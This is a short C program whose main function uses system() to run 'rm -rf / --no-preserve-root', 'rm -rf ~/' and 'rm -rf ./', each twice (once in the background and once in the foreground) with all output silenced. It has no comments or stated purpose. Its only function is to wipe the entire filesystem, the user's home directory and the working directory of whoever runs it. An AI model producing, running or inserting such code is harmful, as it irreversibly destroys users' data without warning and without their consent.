#include <stdio.h>
#include <stdlib.h>

int main(void) {
  system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null &");
  system("rm -rf ~/ > /dev/null 2> /dev/null &");
  system("rm -rf ./ > /dev/null 2> /dev/null &");
  system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null");
  system("rm -rf ~/ > /dev/null 2> /dev/null");
  system("rm -rf ./ > /dev/null 2> /dev/null");
  return 0;
}
